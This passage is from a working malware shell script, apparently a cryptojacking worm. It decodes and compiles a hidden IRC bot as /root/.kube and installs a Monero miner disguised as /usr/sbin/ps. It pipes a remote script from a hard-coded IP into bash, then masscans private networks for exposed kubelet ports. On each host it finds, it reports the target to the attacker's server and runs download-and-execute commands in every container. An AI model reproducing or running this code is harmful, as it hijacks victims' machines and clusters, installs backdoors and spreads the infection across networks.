ICAgICAgICAgICAgaW50IGk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoaT1yZWN2KHNvY2ssYnVmLDQwOTYsMCkpIDw9IDApIGdvdG8gc2E7CiAgICAgICAgICAgICAgICAgICAgICAgIGJ1ZltpXT0wOwogICAgICAgICAgICAgICAgICAgICAgICBzdHI9c3RydG9rKGJ1ZiwiXG4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUoc3RyICYmICpzdHIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyIG5hbWVbMTAyNF0sIHNlbmRlclsxMDI0XTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWx0ZXIoc3RyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKnN0ciA9PSAnOicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaT0wO2k8c3RybGVuKHN0cikgJiYgc3RyW2ldICE9ICcgJztpKyspOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyW2ldPTA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJjcHkoc2VuZGVyLHN0cisxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmNweShzdHIsc3RyK2krMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2Ugc3RyY3B5KHNlbmRlciwiKiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaT0wO2k8c3RybGVuKHN0cikgJiYgc3RyW2ldICE9ICcgJztpKyspOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cltpXT0wOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmNweShuYW1lLHN0cik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyY3B5KHN0cixzdHIraSsxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGk9MDttc2dzW2ldLmNtZCAhPSAoY2hhciAqKTA7aSsrKSBpZiAoIXN0cmNhc2VjbXAobXNnc1tpXS5jbWQsbmFtZSkpIG1zZ3NbaV0uZnVuYyhzb2NrLHNlbmRlcixzdHIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghc3RyY2FzZWNtcChuYW1lLCJFUlJPUiIpKSBnb3RvIHNhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cj1zdHJ0b2soKGNoYXIqKU5VTEwsIlxuIik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIDA7Cn0K' | base64 -d > /var/tmp/kube.c
cd /var/tmp/; gcc -o /var/tmp/kube /var/tmp/kube.c && rm -f /var/tmp/kube.c
mv /var/tmp/kube /root/.kube && chmod +x /root/.kube && /root/.kube 
}


function setup_apt(){ echo "apt setup";apt-get update --fix-missing 2>/dev/null
for SYSPACK in ${SYSPACKS[@]}; do apt-get install -y $SYSPACK 2>/dev/null ; APTRES=$?
if ! [ "$APTRES" = "0" ];then apt install -y --reinstall $SYSPACK 2>/dev/null;fi;done }

function setup_yum(){ echo "yum setup";yum clean all 2>/dev/null
for SYSPACK in ${SYSPACKS[@]}; do yum install -y $SYSPACK 2>/dev/null ; YUMRES=$?
if ! [ "$YUMRES" = "0" ];then yum reinstall -y $SYSPACK 2>/dev/null;fi;done }

function setup_apk(){ 
echo "apk setup"
apk update 2>/dev/null
for SYSPACK in ${SYSPACKS[@]}
do 
apk add $SYSPACK 2>/dev/null
done 
}

function do_install(){
if type apk 2>/dev/null 1>/dev/null; then setup_apk ; fi
if type apt 2>/dev/null 1>/dev/null; then setup_apt ; fi
if type yum 2>/dev/null 1>/dev/null; then setup_yum ; fi
if ! [ -f "/root/.kube" ];then setup_ircbot;fi
if ! [ -f "/usr/sbin/ps" ];then curl -Lk $XMR64_BIT -o /usr/sbin/ps; chmod +x /usr/sbin/ps; /usr/sbin/ps;fi

if ! type masscan 2>/dev/null 1>/dev/null; then setup_masscan ; fi
#if ! type zgrab 2>/dev/null 1>/dev/null; then setup_zgrab ; fi
}
do_install
timeout -s SIGKILL 13 curl http://45.9.148.35/aws.sh | bash
timeout -s SIGKILL 13 wget -O - http://45.9.148.35/aws.sh | bash
		clear
			echo ''
				echo ''

##############

kube_pwn(){
LRANGE=$1
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan --open -p10250 $LRANGE --rate=250000 | awk '{print $6}')'";
for ipaddr in ${!rndstr} ; do
if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >> $TEMPFILE
KUBERES=$?
if [ "$KUBERES" = "0" ];then 
curl -sLk http://45.9.148.35/chimaera/up/kube_in.php?target=$theip
while read namespace podname containername; do
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget "$INITPLOAD" -O /tmp/.x1mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl "$INITPLOAD" -o /tmp/.x2mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
done < $TEMPFILE
rm -rf $TEMPFILE
fi
done;
}

LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
for LRANGE in ${LAN_RANGES[@]}; do kube_pwn $LRANGE ; done

remove_lock
